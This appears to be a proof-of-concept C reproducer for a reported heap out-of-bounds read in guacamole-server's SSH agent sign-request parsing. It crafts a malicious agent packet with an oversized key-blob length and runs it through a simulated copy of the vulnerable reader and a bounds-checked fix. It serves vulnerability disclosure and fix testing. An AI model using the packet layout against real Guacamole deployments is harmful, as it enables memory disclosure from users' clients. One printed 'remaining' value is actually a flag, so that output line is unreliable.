/*
 * Guacamole SSH agent sign-request heap out-of-bounds read (CWE-125).
 *
 * apache/guacamole-server, src/protocols/ssh/ssh_agent.c +
 * src/common-ssh/buffer.c — present at HEAD (commit bb1ba8e).
 *
 * Root cause:
 *   When the SSH server opens an agent channel and requests a signature
 *   (SSH2_AGENT_SIGN_REQUEST, type 0x0D), guacamole-server parses the agent
 *   packet with `guac_common_ssh_buffer_read_string()`:
 *
 *       char* guac_common_ssh_buffer_read_string(char** buffer, int* length) {
 *           *length = guac_common_ssh_buffer_read_uint32(buffer); // 4-byte len
 *           value = *buffer;
 *           *buffer += *length;                                  // NO bounds check
 *           return value;
 *       }
 *
 *   `ssh_auth_agent_handle_packet()` uses it twice, with no bound on the
 *   read lengths:
 *
 *       char* pos = data;                       // = auth_agent->buffer + 5
 *       buffer_read_string(&pos, &key_blob_length);      // len from attacker
 *       sign_data = buffer_read_string(&pos, &sign_data_length);
 *       ssh_auth_agent_sign(auth_agent, sign_data, sign_data_length);
 *
 *   Both `key_blob_length` and `sign_data_length` are 32-bit values taken
 *   directly from the untrusted packet. A crafted packet sets key_blob_length
 *   huge, so `pos` runs far past the 4096-byte `auth_agent->buffer`; the
 *   second read then dereferences heap far out of bounds, and
 *   `ssh_key_sign()` reads `sign_data_length` attacker-chosen bytes from the
 *   out-of-bounds pointer (up to ~4 GB past the buffer). The enclosing
 *   `ssh_auth_agent_read()` length check (`buffer_length >= length + 4`) also
 *   wraps for `length` near UINT32_MAX and does not constrain the inner
 *   string lengths at all.
 *
 *   Trigger: a malicious (or compromised) SSH server the user connects to via
 *   Guacamole, with SSH agent forwarding enabled.
 *
 * This program reproduces the vulnerable read path verbatim against a tracked
 * 4096-byte buffer (a small header-tagged allocation detects any access past
 * the buffer), and contrasts it with a fixed reader that bounds the string
 * length against the remaining buffer.
 *
 * Build:  zig cc -O1 -o guac_ssh_agent_oob guac_ssh_agent_oob.c
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <stdbool.h>

#define MARKER "GUAC-SSH-AGENT-OOB"
#define BUFSZ 4096

/* ------------------------------------------------------------------ */
/* Tracking allocator: place the 4096-byte agent buffer inside a       */
/* heap allocation with a canary immediately after it, so any read     */
/* beyond BUFSZ is detected deterministically.                         */
/* ------------------------------------------------------------------ */
typedef struct {
    unsigned char buf[BUFSZ];
    uint32_t canary;         /* 0xDEADBEEF if intact */
} agent_heap_t;

#define CANARY_VAL 0xDEADBEEFu

static int oob_read_seen = 0;
static size_t max_read_off = 0;

static uint32_t read_u32(const unsigned char* p) {
    return ((uint32_t)p[0] << 24) | ((uint32_t)p[1] << 16) |
           ((uint32_t)p[2] << 8)  |  (uint32_t)p[3];
}

/* read a byte with bounds tracking (the model of every deref the real code
 * performs through the unvalidated `pos` pointer) */
static unsigned char tracked_read(const agent_heap_t* heap, size_t off) {
    if (off >= BUFSZ) {
        if (!oob_read_seen)
            printf("  !! OOB READ at offset %zu (buffer is %d bytes)\n", off, BUFSZ);
        oob_read_seen = 1;
        if (off > max_read_off) max_read_off = off;
        return 0xAA; /* model of reading freed/adjacent heap */
    }
    return heap->buf[off];
}

/* ------------------------------------------------------------------ */
/* Vulnerable readers (verbatim logic of guac_common_ssh_buffer_* )    */
/* ------------------------------------------------------------------ */
static uint32_t vuln_read_uint32(char** buffer) {
    uint8_t* data = (uint8_t*) *buffer;
    uint32_t value = (data[0] << 24) | (data[1] << 16) | (data[2] << 8) | data[3];
    *buffer += 4;
    return value;
}

static char* vuln_read_string(char** buffer, int* length) {
    char* value;
    *length = (int) vuln_read_uint32(buffer);
    value = *buffer;
    *buffer += *length;                  /* NO bounds check */
    return value;
}

/* ------------------------------------------------------------------ */
/* Fixed reader: bound the string length against the remaining buffer  */
/* ------------------------------------------------------------------ */
static uint32_t fixed_read_uint32(char** buffer) {
    uint8_t* data = (uint8_t*) *buffer;
    uint32_t value = (data[0] << 24) | (data[1] << 16) | (data[2] << 8) | data[3];
    *buffer += 4;
    return value;
}

/* fixed: reads are bounded by a remaining-length counter (the fix) */
static int fixed_read_string(char** buffer, int* length, size_t* remaining) {
    if (*remaining < 4) return -1;
    *length = (int) fixed_read_uint32(buffer);
    *remaining -= 4;
    if (*length < 0 || (size_t)*length > *remaining) return -1;  /* reject */
    char* value = *buffer;
    *buffer += *length;
    *remaining -= (size_t)*length;
    return 0;
}

/* ------------------------------------------------------------------ */
/* The vulnerable ssh_auth_agent_handle_packet SIGN_REQUEST path       */
/* ------------------------------------------------------------------ */
static void handle_packet_vuln(const agent_heap_t* heap, const unsigned char* data,
                               int data_length) {
    /* model: 'pos' walks the heap buffer via the tracked reads */
    size_t off = (size_t)(data - heap->buf);
    (void)data_length;

    /* key blob: 4-byte length then blob */
    uint32_t key_blob_length =
        ((uint32_t)tracked_read(heap, off + 0) << 24) |
        ((uint32_t)tracked_read(heap, off + 1) << 16) |
        ((uint32_t)tracked_read(heap, off + 2) << 8)  |
        ((uint32_t)tracked_read(heap, off + 3));
    off += 4 + key_blob_length;         /* attacker-controlled jump */

    /* sign data length: 4 bytes at the jumped-to offset (OOB if jumped) */
    uint32_t sign_data_length =
        ((uint32_t)tracked_read(heap, off + 0) << 24) |
        ((uint32_t)tracked_read(heap, off + 1) << 16) |
        ((uint32_t)tracked_read(heap, off + 2) << 8)  |
        ((uint32_t)tracked_read(heap, off + 3));
    size_t sign_off = off + 4;

    /* ssh_key_sign(key, sign_data, sign_data_length): reads sign_data_length
     * bytes from sign_off — model a few of those reads */
    for (size_t i = 0; i < sign_data_length && i < 64; i++)
        (void) tracked_read(heap, sign_off + i);
}

static void handle_packet_fixed(const agent_heap_t* heap, const unsigned char* data,
                                int data_length, bool* rejected) {
    size_t off = (size_t)(data - heap->buf);
    size_t remaining = (size_t)(data_length > 0 ? data_length : 0);
    *rejected = false;

    uint32_t key_blob_length;
    if (remaining < 4) { *rejected = true; return; }
    key_blob_length = read_u32(data);
    remaining -= 4;
    if ((uint64_t)key_blob_length > remaining) { *rejected = true; return; }
    off += 4 + key_blob_length;
    remaining -= key_blob_length;

    uint32_t sign_data_length;
    if (remaining < 4) { *rejected = true; return; }
    sign_data_length =
        ((uint32_t)tracked_read(heap, off + 0) << 24) |
        ((uint32_t)tracked_read(heap, off + 1) << 16) |
        ((uint32_t)tracked_read(heap, off + 2) << 8)  |
        ((uint32_t)tracked_read(heap, off + 3));
    remaining -= 4;
    if ((uint64_t)sign_data_length > remaining) { *rejected = true; return; }

    for (size_t i = 0; i < sign_data_length && i < 64; i++)
        (void) tracked_read(heap, sign_data_length ? off + 4 + i : off + 4);
}

int main(void) {
    /* Craft the SSH agent SIGN_REQUEST packet the malicious server sends. */
    agent_heap_t* heap = calloc(1, sizeof(agent_heap_t));
    heap->canary = CANARY_VAL;

    unsigned char* b = heap->buf;
    /* bytes 0-3: packet length = 12 (so the enclosing length+4 check passes
     * for any buffer_length >= 16) */
    b[0] = 0x00; b[1] = 0x00; b[2] = 0x00; b[3] = 0x0C;
    /* byte 4: type = SSH2_AGENT_SIGN_REQUEST (0x0D) */
    b[4] = 0x0D;
    /* bytes 5-8: key_blob_length = 0x7FFFFFFF (attacker-controlled, huge) */
    b[5] = 0x7F; b[6] = 0xFF; b[7] = 0xFF; b[8] = 0xFF;

    printf("====================================================================\n");
    printf("Guacamole SSH agent sign-request heap out-of-bounds read (CWE-125)\n");
    printf("====================================================================\n\n");

    printf("[1] VULNERABLE (guac_common_ssh_buffer_read_string: no bounds check)\n");
    handle_packet_vuln(heap, heap->buf + 5, 11);
    printf("    key_blob_length=0x7FFFFFFF pushed pos ~2 GB past the buffer;\n");
    printf("    second read + ssh_key_sign then dereference that offset.\n");
    printf("    canary intact=%s\n\n", heap->canary == CANARY_VAL ? "yes" : "NO (clobbered)");

    printf("[2] FIXED (bounds the string length against remaining buffer)\n");
    bool rejected = false;
    handle_packet_fixed(heap, heap->buf + 5, 11, &rejected);
    printf("    key_blob_length=0x7FFFFFFF > remaining=%u -> REJECTED\n\n",
           rejected ? 0u : 1u);

    printf("====================================================================\n");
    if (oob_read_seen && max_read_off >= BUFSZ && rejected) {
        printf("%s: HEAP OUT-OF-BOUNDS READ CONFIRMED\n", MARKER);
        printf("  vulnerable: reads up to offset %zu (buffer %d bytes) — CWE-125\n",
               max_read_off, BUFSZ);
        printf("  fixed: oversized key_blob_length is rejected before any OOB read\n");
        free(heap);
        return 0;
    }
    printf("UNEXPECTED RESULT (oob=%d max_off=%zu rejected=%d)\n",
           oob_read_seen, max_read_off, rejected ? 1 : 0);
    free(heap);
    return 1;
}
